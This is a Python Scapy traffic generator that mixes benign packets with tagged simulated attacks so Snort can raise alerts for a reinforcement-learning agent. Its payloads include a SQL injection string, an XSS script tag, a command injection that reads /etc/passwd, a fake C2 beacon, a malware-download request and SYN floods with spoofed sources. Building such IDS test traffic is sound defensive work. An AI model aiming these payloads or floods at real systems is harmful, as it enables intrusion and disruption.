#!/usr/bin/env python3
"""
scapy_traffic.py — Real-time tagged traffic generator for Snort + DDPG
----------------------------------------------------------------------

Generates both benign and malicious traffic patterns on a specified interface.
Each attack carries a unique payload/tag so Snort rules can differentiate them,
allowing your RL agent to prioritize distinct alert types.

Usage:
    python3.7 src/scapy_traffic.py --iface lo --interval 0.5 --ratio 0.4 --continuous \
        --benign-burst 5 --attack-burst 20
"""

import argparse
import random
import time
from scapy.all import (
    IP, TCP, UDP, ICMP, send, RandIP, RandShort, Raw
)

# ============================================================
# Tagged Attack Signatures (for Snort to detect)
# ============================================================
SIGNATURES = {
    "SYN_FLOOD": b"ATTACK_SYN_FLOOD",
    "PORT_SCAN": b"ATTACK_PORT_SCAN",
    "SQL_INJECTION": b"ATTACK_SQL_INJECTION",
    "HTTP_C2": b"ATTACK_HTTP_C2",
    "DNS_TUNNELING": b"ATTACK_DNS_TUNNELING",
    "BRUTE_FORCE": b"ATTACK_BRUTE_FORCE",
    "DDOS": b"ATTACK_DDOS",
    "XSS": b"ATTACK_XSS",
    "COMMAND_INJECTION": b"ATTACK_COMMAND_INJECTION",
    "MALWARE_DOWNLOAD": b"ATTACK_MALWARE_DOWNLOAD"
}

# ============================================================
# Benign Traffic Generators
# ============================================================
def benign_http(dst="127.0.0.1"):
    pkt = IP(dst=dst) / TCP(dport=80, sport=RandShort(), flags="S") / Raw(
        b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"
    )
    return pkt

def benign_dns(dst="127.0.0.1"):
    pkt = IP(dst=dst) / UDP(dport=53, sport=RandShort()) / Raw(b"\x12\x34 benign query")
    return pkt

def benign_icmp(dst="127.0.0.1"):
    pkt = IP(dst=dst) / ICMP()
    return pkt

# ============================================================
# Attack Traffic Generators (Tagged)
# ============================================================
def attack_syn_flood(dst="127.0.0.1", count=5):
    tag = SIGNATURES["SYN_FLOOD"]
    pkts = [
        IP(src=str(RandIP()), dst=dst) / TCP(sport=RandShort(), dport=80, flags="S") / Raw(tag)
        for _ in range(count)
    ]
    return pkts, "SYN_FLOOD"

def attack_port_scan(dst="127.0.0.1", ports=None, count=10):
    tag = SIGNATURES["PORT_SCAN"]
    if ports is None:
        # Sample a wider range of ports to increase alert diversity
        port_pool = list(range(1, 1024))
        sample_size = min(count, len(port_pool))
        ports = random.sample(port_pool, sample_size)
    else:
        # Respect user-provided ports but repeat to meet the desired count
        if len(ports) < count:
            reps = count // len(ports) + 1
            ports = (ports * reps)[:count]
        else:
            ports = ports[:count]

    pkts = [
        IP(src=str(RandIP()), dst=dst) / TCP(sport=RandShort(), dport=p, flags="S") / Raw(tag)
        for p in ports
    ]
    return pkts, "PORT_SCAN"

def attack_sql_injection(dst="127.0.0.1", count=1):
    tag = SIGNATURES["SQL_INJECTION"]
    payload = b"GET /login.php?user=admin' OR '1'='1 -- " + tag
    pkts = [
        IP(dst=dst) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(payload)
        for _ in range(count)
    ]
    return pkts, "SQL_INJECTION"

def attack_http_c2(dst="127.0.0.1", count=3):
    tag = SIGNATURES["HTTP_C2"]
    payload_template = (
        b"POST /beacon HTTP/1.1\r\n"
        b"Host: c2.example\r\n"
        b"User-Agent: curl/7.79\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Content-Length: 64\r\n\r\n"
    )
    pkts = [
        IP(dst=dst) / TCP(dport=8080, sport=RandShort(), flags="PA") / Raw(payload_template + tag + bytes(str(i), "utf-8"))
        for i in range(count)
    ]
    return pkts, "HTTP_C2"

def attack_dns_tunneling(dst="127.0.0.1", count=5):
    tag = SIGNATURES["DNS_TUNNELING"]
    pkts = [
        IP(dst=dst) / UDP(dport=53, sport=RandShort()) / Raw(tag + b".tunnel%d.example" % i)
        for i in range(count)
    ]
    return pkts, "DNS_TUNNELING"

def attack_brute_force(dst="127.0.0.1", count=5):
    tag = SIGNATURES["BRUTE_FORCE"]
    pkts = [
        IP(src=str(RandIP()), dst=dst) / TCP(sport=RandShort(), dport=22, flags="PA") / Raw(tag + b" attempt%d" % i)
        for i in range(count)
    ]
    return pkts, "BRUTE_FORCE"

def attack_ddos(dst="127.0.0.1", count=20):
    tag = SIGNATURES["DDOS"]
    pkts = [
        IP(src=str(RandIP()), dst=dst) / TCP(sport=RandShort(), dport=RandShort(), flags="S") / Raw(tag)
        for _ in range(count)
    ]
    return pkts, "DDOS"

def attack_xss(dst="127.0.0.1", count=1):
    tag = SIGNATURES["XSS"]
    payload = b"GET /page?input=<script>alert('xss')</script> HTTP/1.1\r\nHost: example.com\r\n\r\n" + tag
    pkts = [
        IP(dst=dst) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(payload)
        for _ in range(count)
    ]
    return pkts, "XSS"

def attack_command_injection(dst="127.0.0.1", count=1):
    tag = SIGNATURES["COMMAND_INJECTION"]
    payload = b"GET /exec?cmd=;cat /etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n" + tag
    pkts = [
        IP(dst=dst) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(payload)
        for _ in range(count)
    ]
    return pkts, "COMMAND_INJECTION"

def attack_malware_download(dst="127.0.0.1", count=1):
    tag = SIGNATURES["MALWARE_DOWNLOAD"]
    payload = b"GET /malware.exe HTTP/1.1\r\nHost: malicious.com\r\n\r\n" + tag
    pkts = [
        IP(dst=dst) / TCP(dport=80, sport=RandShort(), flags="PA") / Raw(payload)
        for _ in range(count)
    ]
    return pkts, "MALWARE_DOWNLOAD"

# ============================================================
# Main Traffic Loop
# ============================================================
def run_traffic(iface, ratio, interval, continuous, benign_burst, attack_burst):
    benign_funcs = [benign_http, benign_dns, benign_icmp]
    attack_funcs = [
        attack_syn_flood,
        attack_port_scan,
        attack_sql_injection,
        attack_http_c2,
        attack_dns_tunneling,
        attack_brute_force,
        attack_ddos,
        attack_xss,
        attack_command_injection,
        attack_malware_download,
    ]
    dst_ip = "127.0.0.1" if iface == "lo" else "192.168.0.100"  # adjust per network

    print(f"\n[+] Starting Tagged Scapy traffic on interface: {iface}")
    print(f"    Benign:Attack ratio = {1 - ratio:.1f}:{ratio:.1f}, interval = {interval}s")
    print(f"    Benign burst = {benign_burst} pkts, Attack burst = {attack_burst} pkts\n")

    try:
        while True:
            if random.random() < ratio:
                atk_func = random.choice(attack_funcs)
                # Allow each attack to emit multiple packets for stronger alert signals
                pkts, atk_name = atk_func(dst_ip, count=attack_burst)

                if isinstance(pkts, list):
                    send(pkts, iface=iface, verbose=False)
                    total_sent = len(pkts)
                else:
                    send(pkts, iface=iface, count=attack_burst, verbose=False)
                    total_sent = attack_burst
                print(f"[ATTACK] {atk_name} ({total_sent} pkts) sent with tag={SIGNATURES[atk_name].decode()}")
            else:
                func = random.choice(benign_funcs)
                for _ in range(benign_burst):
                    pkt = func(dst_ip)
                    send(pkt, iface=iface, verbose=False)
                print(f"[BENIGN] {func.__name__} x{benign_burst}")

            time.sleep(interval)
            if not continuous:
                break
    except KeyboardInterrupt:
        print("\n[+] Traffic generator stopped.")


# ============================================================
# CLI Entrypoint
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="Scapy-based traffic generator with Snort attack tagging.")
    parser.add_argument("--iface", default="lo", help="Interface to send packets on (default: lo)")
    parser.add_argument("--interval", type=float, default=0.5, help="Time between packets (seconds)")
    parser.add_argument("--ratio", type=float, default=0.3, help="Fraction of malicious packets [0–1]")
    parser.add_argument("--continuous", action="store_true", help="Run continuously (default: one cycle)")
    parser.add_argument("--benign-burst", type=int, default=3, help="Number of benign packets per benign cycle")
    parser.add_argument("--attack-burst", type=int, default=10, help="Number of attack packets per attack cycle")
    args = parser.parse_args()

    run_traffic(args.iface, args.ratio, args.interval, args.continuous, args.benign_burst, args.attack_burst)


if __name__ == "__main__":
    main()
    
